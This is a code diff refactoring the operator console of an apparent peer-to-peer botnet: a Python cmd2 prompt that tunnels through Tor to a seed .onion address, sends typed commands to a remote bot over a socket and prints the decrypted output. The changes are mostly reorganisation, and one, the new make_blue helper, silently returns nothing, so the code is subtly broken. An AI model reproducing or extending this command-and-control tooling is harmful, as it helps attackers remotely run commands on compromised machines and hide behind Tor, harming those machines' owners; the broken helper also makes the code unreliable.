@@ -1,4 +1,3 @@
-import os
 import socket
 import socks
 import random
@@ -8,10 +7,10 @@ import argparse
 import cmd2
 from cmd2 import with_argparser, with_category, categorize
 
-from botnet_p2p import ENCODING, EXIT
-from botnet_p2p.message import structure_msg, sign_structured_msg
-from botnet_p2p.security import decrypt
-from botnet_p2p.operations import close_terminal
+from .botnet_p2p import ENCODING
+from .botnet_p2p.message import structure_msg, sign_structured_msg
+from .botnet_p2p.security import decrypt
+from .botnet_p2p.operations import close_terminal
 
 BUFFER_SIZE = 4096
 TOR_SERVER_PORT = 50001
@@ -21,15 +20,14 @@ UPDATE_FILE = 2
 
 readline.parse_and_bind("tab: complete")
 
-print_red = lambda msg: print(f"{Fore.LIGHTRED_EX}{msg}{Style.RESET_ALL}")
-print_yellow = lambda msg: print(f"{Fore.LIGHTYELLOW_EX}{msg}{Style.RESET_ALL}")
-print_green = lambda msg: print(f"{Fore.LIGHTGREEN_EX}{msg}{Style.RESET_ALL}")
-make_blue = lambda msg: f"{Fore.LIGHTBLUE_EX}{msg}{Style.RESET_ALL}"
-
 socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
 socket.socket = socks.socksocket
 
 seed_directions = ["57yvvr2pfb46zull.onion"]
+
+
+def make_blue(msg: str):
+    f"{Fore.LIGHTBLUE_EX}{msg}{Style.RESET_ALL}"
 
 
 class MyPrompt(cmd2.Cmd):
@@ -42,7 +40,7 @@ class MyPrompt(cmd2.Cmd):
  | |    | '_ \ / _` | '_ ` _ \ / _ | |/ _ \/ _ \| '_ \ 
  | |____| | | | (_| | | | | | |  __| |  __| (_) | | | |
   \_____|_| |_|\__,_|_| |_| |_|\___|_|\___|\___/|_| |_|
-                                                       
+                                                      
                                                        
 
 
@@ -185,16 +183,19 @@ class MyPrompt(cmd2.Cmd):
     def default(self, inp: cmd2.Statement):
         msg = inp.command_and_args
         if self.__terminal is True:
-            coded_msg = msg.encode(ENCODING)
-            self.__socket.send(coded_msg)
-            ciphertext = self.__socket.recv(BUFFER_SIZE)
-            plain_text = decrypt(ciphertext, self.__private_key_path)
-            print_yellow(plain_text)
+            self.__execute_remotely(msg)
         else:
             if msg == "q":
                 return self.do_exit(msg)
             else:
                 print("Unrecognized command")
+
+    def __execute_remotely(self, msg: str):
+        coded_msg = msg.encode(ENCODING)
+        self.__socket.send(coded_msg)
+        ciphertext = self.__socket.recv(BUFFER_SIZE)
+        plain_text = decrypt(ciphertext, self.__private_key_path)
+        print_yellow(plain_text)
 
     do_EOF = do_exit
     help_EOF = help_exit
@@ -245,6 +246,18 @@ def node_from_index(index: int, node_list_path: str = None):
 def complete(arguments: list, text: str):
     completions = [argument for argument in arguments if argument.startswith(text)]
     return completions
+
+
+def print_red(msg: str):
+    print(f"{Fore.LIGHTRED_EX}{msg}{Style.RESET_ALL}")
+
+
+def print_yellow(msg: str):
+    print(f"{Fore.LIGHTYELLOW_EX}{msg}{Style.RESET_ALL}")
+
+
+def print_green(msg: str):
+    print(f"{Fore.LIGHTGREEN_EX}{msg}{Style.RESET_ALL}")
 
 
 if __name__ == "__main__":
